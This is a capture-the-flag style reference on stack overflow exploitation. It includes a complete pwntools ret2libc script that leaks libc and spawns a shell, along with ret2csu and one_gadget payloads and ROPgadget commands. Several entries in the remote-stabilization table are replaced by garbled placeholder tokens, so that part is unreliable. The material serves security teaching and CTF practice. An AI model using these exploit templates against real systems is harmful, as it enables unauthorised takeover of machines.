# Stack Class Exploitation (Stack Pwn)

## Trigger Conditions and Pre-Checks

### checksec Analysis

```bash
checksec --file=./vuln
# Or comes with pwntools
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Output Field | Impact | Response |
|---------|------|------|
| `NX disabled` | Stack executable | Directly inject shellcode |
| `Canary found` | Stack overflow will be detected | Must first leak the canary or bypass it (forked process / format string) |
| `PIE enabled` | .text base address randomization | must leak a code address |
| `No PIE` | .text fixed | gadget address hard-coded |
| `Full RELRO` | got is not writable | cannot modify got, use ret2libc / one_gadget |
| `Partial RELRO` | got writable | can modify got table |
| `FORTIFY` | Some libc functions are replaced with `_chk` versions | `read_chk` can still overflow, `strcpy_chk` cannot |

### Precise Localization of Stack Overflow Length

```python
# pwntools cyclic pattern
from pwn import *
context.arch = 'amd64'

# 1. Generate cyclic pattern
payload = cyclic(200)

# 2. Feed it to the program to trigger a crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. Reading the value on RSP from the core dump
core = p.corefile
fault = core.fault_addr  # 或 core.rsp 指向的 8 字节
offset = cyclic_find(fault & 0xffffffff)  # 32-bit 模式
# 64-bit using cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### Quick Reference for 32 / 64-bit Calling Conventions

| Architecture | Parameter Passing | Return | Remarks |
|------|---------|------|------|
| x86 (32-bit) | Stack passing (cdecl: caller cleans the stack) | eax | Stack structure: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned at the call entry |
| ARM32 | r0-r3, stack | r0 | lr stores return address, bx lr returns |
| ARM64 | x0-x7, stack | x0 | Similar to SysV, stricter alignment |

## ret2libc Complete pwntools Template

```python
#!/usr/bin/env python3
from pwn import *

# === Environment Configuration ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# Automatically use patchelf to make the local environment use the libc provided by the problem
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # 通过 cyclic 测出来
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # 用于栈对齐

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # 让 puts 打印 puts@got 自己的地址
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # 回到 main，复用栈溢出做第二轮

p.sendlineafter(b'> ', payload)

# Receive leak (pay attention to the recvuntil anchor string, do not use sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# Reverse lookup libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # 关键：补齐 16-byte 对齐
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack Alignment Pitfalls (Must Read)

```text
Phenomenon: It works locally, but as soon as the remote system enters, it gets a SIGSEGV
Reason: libc's system → do_system → somewhere inside movaps xmm0, [rsp]
Requires rsp to be 16-byte aligned
Failure: When your ROP chain jumps to system, the last byte of rsp is 0x8 instead of 0x0
Fix: Insert a `ret` gadget in the ROP chain (consumes 8 bytes, realigns rsp)
```

## ret2csu (universal gadget)

When there is no third-parameter gadget like `pop rdx; ret` in the binary, use the fixed structure in `__libc_csu_init` (which exists in programs statically linked with glibc < 2.34).

```text
__libc_csu_init fixed pattern at the end:
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

In the middle there is also:
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
mov  edi, r13d ; r13 → rdi (lower 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools syntax:

```python
csu_pop = 0x40119a  # 第一段（pop rbx..r15; ret）
csu_call = 0x401180  # 第二段（mov rdx,r15; ... ; call [r12+rbx*8]）

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1（要使后续 cmp rbx,rbp 通过 → rbx+1 == rbp）
    p += p64(call_target)    # r12 = [r12+rbx*8] 解引用得到目标
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # 第二段 ret 后又 pop 7 个
    return p
```

Applicable: Write a function pointer in bss, then use csu to call it. Commonly used to jump to bss and execute ROP after the `read(0, bss, 0x100)` stage.

## one_gadget Usage

```bash
one_gadget ./libc.so.6

# Output similar to:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

Usage:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # 挑约束能满足的那个
```

**Pitfall**: one_gadget is extremely difficult to satisfy in certain libc versions (2.34+); honestly, ret2libc is more stable.

## libc-database Reverse Lookup

Scenario: The problem doesn't provide libc, so you can only leak a few function addresses to infer the version backwards.

```bash
cd ~/tools/libc-database

# Use the leaked puts and read addresses (take the last 3 digits) to look up
./find puts 0x6f0 read 0xfd
# Output: libc6_2.31-0ubuntu9.9_amd64

# Get all symbol offsets of the corresponding libc
./dump libc6_2.31-0ubuntu9.9_amd64

# Download the actual libc.so.6 to local
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

Pwntools integration:

```python
# Online libc-database query (no local setup required)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget Quick Reference

```bash
# Basics: pop|ret single reg
ROPgadget --binary ./vuln --only "pop|ret"

# Find syscall
ROPgadget --binary ./vuln | grep ': syscall'

# Find with specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# Find string
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# Output JSON for program parsing
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper alternative (broader architecture support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote Stabilization Checklist

| Problem | Phenomenon | Solution |
|------|------|------|
| libc version error | Local connection successful, remote SIGSEGV in system | After leak, use libc-database to reverse check the actual version |
| Stack alignment | system immediately segmentation fault | add a xKx0000xKx gadget |
| Network latency | recv received halfway | Use xKx0001xKx, do not use xKx0002xKx |
| Buffer | sendline no response after sending | Change to xKx0003xKx, wait clearly for the prompt before sending |
| ASLR randomization | Probability of success | See if byte-level brute force (xKx0004xKx probability is not considered stable) |
| TCP Nagle | Small packet aggregation | xKx0005xKx minimum guarantee |

## Debugging Tips

```python
# pwntools embedded gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# Run in gdb from the start
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

GEF/pwndbg Common Commands:

```text
checksec               # Check protections
vmmap                  # Memory layout
telescope $rsp 30      # Stack chain (pwndbg)
stack 30               # similar to (GEF)
got                    # GOT table
search-pattern "/bin/sh"
context                # Automatically display reg + stack + code (on by default)
ropgadget              # Embedded gadget search
```

## Notes

- **NX off + ASLR off** are required to directly execute shellcode; modern binaries basically all have NX enabled
- **The canary does not change in forked subprocesses** — the forking server can be brute-forced byte by byte (1/256 × 7 bytes)
- **Formatted strings can leak both the canary and libc** — use `%p %p ... %p` to scan the stack
- **DynELF is slow but versatile** — When libc is completely unknown, pwntools' `DynELF` can leak the symbol table byte by byte purely using the program's own IO primitives
- **Statically linked programs don’t have libc.got** — use SROP (sigreturn-oriented programming) or direct syscalls